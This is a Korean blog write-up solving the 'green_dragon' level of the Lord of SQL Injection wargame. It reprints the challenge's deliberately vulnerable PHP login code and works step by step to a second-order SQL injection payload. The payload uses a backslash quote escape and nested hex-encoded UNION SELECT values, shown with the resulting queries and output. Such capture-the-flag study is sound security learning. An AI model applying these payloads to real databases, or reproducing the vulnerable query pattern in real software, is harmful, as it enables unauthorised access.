---
title: "[Lord of SQL Injection] LoS - green_dragon 문제풀이"
date: 2018-08-25
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

다시  `los.rubiya.kr`의 서버로 돌아와서 다음 문제를 풀어보았다.
드디어 `dragon` 시리즈의 시작이다.  

<!--more-->

코드는 다음과 같다.  

```php
------------------------------------------------------------------------------------------
query : select id,pw from prob_green_dragon where id='' and pw=''
------------------------------------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\'|\"/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\'|\"/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id,pw from prob_green_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']){
    if(preg_match('/prob|_|\.|\'|\"/i', $result['id'])) exit("No Hack ~_~");
    if(preg_match('/prob|_|\.|\'|\"/i', $result['pw'])) exit("No Hack ~_~");
    $query2 = "select id from prob_green_dragon where id='{$result[id]}' and pw='{$result[pw]}'";
    echo "<hr>query2 : <strong>{$query2}</strong><hr><br>";
    $result = mysql_fetch_array(mysql_query($query2));
    if($result['id'] == "admin") solve("green_dragon");
  }
  highlight_file(__FILE__);
?>
```

소스코드가 좀 길어졌다.
쿼리가 2개가 있는데, 첫 번째 쿼리는 내가 입력한 `id`와 `pw`를 가지고 `prob_green_dragon` 테이블에서 값을 뽑아온다.
그런데 이 후, 해당 테이블에서 추출 한 `id`와 `pw`를 가지고 다시 필터링을 거친 후에, 결과로 나왔던 그 `id`와 `pw`를 가지고 한번 더 쿼리를 수행한다.
그래서 나온 결과값의 `id`의 값이 `admin`이라면 문제를 풀 수 있다.
필터링에 `'(싱글쿼터)`가 있기 때문에 먼저 이를 우회해야 한다.
이 전 문제에서 이와 유사한 문제가 있었기 때문에 아래와 같이 입력 해 필터링 우회를 시도 해 보았다.  

```plain
?id=\&pw= or id=0x61646d696e#
```

이를 입력하면 완성되는 쿼리는 아래와 같다.  

```mysql
select id,pw from prob_green_dragon where id='\' and pw=' or id=0x61646d696e#'
```

때문에 `id`가 `\'and pw`이거나 `id`가 `0x61646d696e`인 값을 데이터베이스에서 찾아 추출하게 된다.
그런데 아무리 해도 결과 값이 나오지 않았다.
처음엔 내가 문제를 잘못푼 줄 알았는데, 다시 생각해보니 `$query2`의 존재가 의심스러웠다.
만약에 내가 했던 방법으로 문제가 풀릴 거라면, `$query`에서 나온 결과값이 바로 데이터베이스에 저장되어 있던 `id`와 `pw`의 값이기 때문에 이에 대해 따로 필터링을 할 필요가 없을 것 같았다.
또한 그 `id`와 `pw`로 다시 한 번 `select`를 하는 것은 무의미해 보였다.

그러다보니 이 테이블이 비어있다고 생각하게 되었다.
테이블에 아무런 값이 없으니 아무리 조건을 넣어도 추출 할 값이 없었던 것이다.
그래서 두 쿼리를 거친 결과가 `select 'admin'`이 되면 문제를 풀 수 있을 것이라고 생각했다.
일단 `$query2`를 출력시키기 위해 `id`에는 `\`를, `pw`에는 `union select 1, 2%23`를 입력 해 보았다.

```plain
?id=\&pw=union select 1, 2%23
```

그 결과 아래와 같이 두 번째 쿼리가 출력되는 것을 확인할 수 있었다.  

```php
----------------------------------------------------------------------------------------------------------------
query : select id,pw from prob_green_dragon where id='\' and pw='union select 1,2#'
----------------------------------------------------------------------------------------------------------------

-----------------------------------------------------------------------------------------
query2 : select id from prob_green_dragon where id='1' and pw='2'
-----------------------------------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\'|\"/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\'|\"/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id,pw from prob_green_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']){
    if(preg_match('/prob|_|\.|\'|\"/i', $result['id'])) exit("No Hack ~_~");
    if(preg_match('/prob|_|\.|\'|\"/i', $result['pw'])) exit("No Hack ~_~");
    $query2 = "select id from prob_green_dragon where id='{$result[id]}' and pw='{$result[pw]}'";
    echo "<hr>query2 : <strong>{$query2}</strong><hr><br>";
    $result = mysql_fetch_array(mysql_query($query2));
    if($result['id'] == "admin") solve("green_dragon");
  }
  highlight_file(__FILE__);
?>
```

예상대로 두 번째 쿼리에 1과 2가 들어갔다.
그럼 이제 `union select 1, 2` 자리에 적당한 값을 넣어서 두 번째 쿼리가 `select admin`을 하도록 만들면 될 것 같다.

그런데 `$result['id']`와 `$result['pw']`에 대해서도 같은 필터링이 걸려 있으므로 문자열은 사용할 수가 없고, 싱글쿼터를 우회해야 한다.
그래서 두 번째 쿼리의 `id` 값에는 `\`가 들어가야 한다는 것을 쉽게 알 수 있다.
이 때, `\`는 문자이기 때문에 `union select \, 2` 형태로 넣을 수 없기 때문에 `\` 또한 hex 값으로 바꾸어 넣어주어야 한다.
문제는 `$result['pw']` 자리에 들어갈 내용이다.
내가 만들고 싶은 두 번째 쿼리의 형태는 다음과 같다.  

```mysql
select id from prob_green_dragon where id='\' and pw='union select 0x61646d696e#
```

그러면 뒤의 `union select 0x61646d696e`가 되어, 최종적으로 `admin`을 추출할 수 있게 된다.
그런데 문제는 첫 번째 쿼리에서 뭐라고 입력해야 두 번째 쿼리에 내가 원하는 값을 넣을 수 있느냐는 것이었다.
서버에서 테스트를 해 보았는데, 아래와 같이 입력하니 결과값을 얻을 수 있었다.  

```bash
mysql> select id, pw from user where id='\' and pw=' union select 1, (select 2);
+----+----+
| id | pw |
+----+----+
| 1  | 2  |
+----+----+
1 row in set (0.01 sec)
```

이를 그대로 넣으면, 두 번째 쿼리의 `pw` 자리에 `2`가 들어간다.
그렇다면 `2`를 적절히 수정해서 `union select 0x61646d696e`를 만들면 된다.
그런데 앞에서 말했다시피 싱글쿼터와 더블쿼터가 필터링 되어 있기 때문에 `hex`로 변경 해서 값을 넣어주어야 한다.
`union select 0x61646d696e`를 하나하나 hex 값으로 바꾸면 `0x756e696f6e2073656c6563742030783631363436643639366523`이 된다.
이 값을 아래와 같이 쿼리스트링으로 넘겨주었다.  

```plain
?id=\&pw= union select 0x5c, (select 0x756e696f6e2073656c6563742030783631363436643639366523)%23
```

역시 내 예상과 맞게 문제를 풀 수 있었다.  

```php
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
query : select id,pw from prob_green_dragon where id='\' and pw=' union select 0x5c, (select 0x756e696f6e2073656c6563742030783631363436643639366523)#'
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

------------------------------------------------------------------------------------------------------------------------------
query2 : select id from prob_green_dragon where id='\' and pw='union select 0x61646d696e#'
------------------------------------------------------------------------------------------------------------------------------

GREEN_DRAGON Clear!
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\'|\"/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\'|\"/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id,pw from prob_green_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']){
    if(preg_match('/prob|_|\.|\'|\"/i', $result['id'])) exit("No Hack ~_~");
    if(preg_match('/prob|_|\.|\'|\"/i', $result['pw'])) exit("No Hack ~_~");
    $query2 = "select id from prob_green_dragon where id='{$result[id]}' and pw='{$result[pw]}'";
    echo "<hr>query2 : <strong>{$query2}</strong><hr><br>";
    $result = mysql_fetch_array(mysql_query($query2));
    if($result['id'] == "admin") solve("green_dragon");
  }
  highlight_file(__FILE__);
?>
```

---

```plain
GREEN_DRAGON Clear!
```